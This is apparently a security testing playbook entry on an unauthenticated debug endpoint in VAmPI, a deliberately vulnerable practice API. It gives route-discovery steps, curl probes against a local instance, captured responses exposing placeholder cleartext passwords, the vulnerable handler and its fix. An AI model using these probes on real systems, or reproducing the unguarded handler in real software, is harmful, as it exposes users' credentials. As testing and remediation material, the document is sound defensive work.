# API5-BFLA-01: Unauthenticated dump of every user record including passwords

| | |
|---|---|
| **OWASP** | [API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/) |
| **CWE** | [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html) |
| **Severity** | Critical |
| **Validated against** | VAmPI at `f16052dc`, `GET /users/v1/_debug` |
| **Runnable** | `python -m authzprobe.probe` case `API5-BFLA-01` |

> Added beyond the two classes this playbook set out to cover. It is here
> because the probe's identity matrix detects function-level and object-level
> failures with the same mechanism, so the marginal cost was one case
> definition.

## Purpose

Establish whether privileged *operations* are reachable by unprivileged
callers. BOLA asks whether you may touch a given object. BFLA asks whether you
may invoke the function at all.

This is the failure mode that survives testing longest, because an
administrative endpoint works correctly whenever an administrator tries it. The
person most likely to test it is the person least likely to see the bug.

Debug and diagnostic routes are the highest-yield place to look. They are added
during development, guarded by nothing because the developer is already
authenticated locally, and then shipped.

## Identification

1. Build the route inventory from something other than the UI: the OpenAPI
   document, a JS bundle, `robots.txt`, git history, or a wordlist against
   common names (`_debug`, `/internal`, `/admin/api`, `/actuator`, `/metrics`).
   VAmPI publishes `/users/v1/_debug` in its own OpenAPI document.
2. Call each as the *lowest* privilege available, including anonymous.
3. For each `2xx`, ask what the least-privileged successful caller was, and
   whether the operation should have been available to them.
4. Check the UI-versus-API gap specifically. A page that renders conditionally
   on a role is not an authorization control, and the JSON endpoint behind it
   is frequently unguarded. Testing through the browser will not find this.

## Implementation

```bash
# No credential
curl -i http://127.0.0.1:5000/users/v1/_debug

# And as an ordinary user, to show the role is irrelevant
TOKEN=$(curl -s -X POST http://127.0.0.1:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"name1","password":"pass1"}' | jq -r .auth_token)
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/users/v1/_debug
```

## Success criteria

Confirmed when a caller below the operation's intended privilege level
receives `2xx`. Observed matrix:

| Identity | Status |
|---|---|
| `admin` | `200` |
| `owner` (ordinary user) | `200` |
| `other` (ordinary user) | `200` |
| `anon` (no credential) | `200` |

Every identity, including anonymous, receives the full user table with
cleartext passwords. There is no authorization on this function.

Severity is Critical here because the response contains every credential in the
system, which makes it a full compromise rather than an information leak. Rate
on response content, not on the route's name.

## Original and modified exchange

Verbatim from `captures/vampi-2026-10-21.md`. There is no "original" legitimate
request to contrast against, which is itself the finding: the operation has no
authorized caller because it has no check.

**As an authenticated ordinary user:**

```http
GET /users/v1/_debug HTTP/1.1
Authorization: Bearer <name1 token>
```

```http
HTTP/1.1 200

{"users": [
  {"admin": false, "email": "mail1@mail.com", "password": "pass1",  "username": "name1"},
  {"admin": false, "email": "mail2@mail.com", "password": "pass2",  "username": "name2"},
  {"admin": true,  "email": "admin@mail.com", "password": "pass1",  "username": "admin"}
]}
```

**Modified** — the `Authorization` header removed:

```http
GET /users/v1/_debug HTTP/1.1
```

```http
HTTP/1.1 200

{"users": [ ... identical ... ]}
```

For comparison, the same API's `PUT /users/v1/{username}/password` returns
`401` without a credential. Authentication is wired up on some routes and not
others, which is the signature of per-handler checks rather than a default.

## Remediation

```python
# Vulnerable: no credential, no role, no check
def debug():
    return jsonify({"users": User.get_all_users_debug()})

# Fixed, if the endpoint must exist at all
@admin_required
def debug():
    claims = token_validator(request.headers.get("Authorization"))
    actor = User.query.filter_by(username=claims["sub"]).first()
    if not actor.admin:
        return Response(..., 404)
    return jsonify({"users": [safe_projection(u) for u in User.query.all()]})
```

In priority order:

1. **Delete it.** A diagnostic route that dumps credentials has no production
   use. The best fix for this class is removal, not authorization.
2. Deny by default. Authorization belongs in middleware that every route
   inherits, with public routes as an explicit, reviewable exception list. Any
   design where a developer must remember to add a check will eventually ship
   one that forgot.
3. Never return credential material, hashed or otherwise, from any endpoint.
4. Authorize the API, not the page. If the UI hides a button based on a role,
   the endpoint behind it needs the same check server-side.
5. Alert on unauthenticated `2xx` responses to routes outside the public
   allowlist. This is cheap and catches the whole class in production.

## Notes

Detectable statically, and it was: `bfla-missing-function-authorization` in
[devsecops-pipeline-lab](https://github.com/gl1tchdust/devsecops-pipeline-lab)
flags this at `users.py:25`. That rule's measured precision on VAmPI is 0.750,
which is why it is permitted to fail a build there.
